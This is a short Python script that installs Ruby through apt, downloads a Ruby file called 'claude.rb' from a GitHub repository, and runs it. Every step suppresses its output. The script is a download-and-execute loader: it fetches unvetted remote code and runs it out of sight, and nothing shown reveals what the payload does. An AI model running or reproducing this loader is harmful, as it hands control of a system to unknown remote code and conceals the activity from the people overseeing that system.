import subprocess
import urllib.request
import os

url = "https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/claude.rb"
filename = "claude.rb"

# Install ruby silently
subprocess.run(["apt", "update"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.run(["apt", "install", "ruby", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Download the file
urllib.request.urlretrieve(url, filename)

# Run it silently
subprocess.run(["ruby", filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
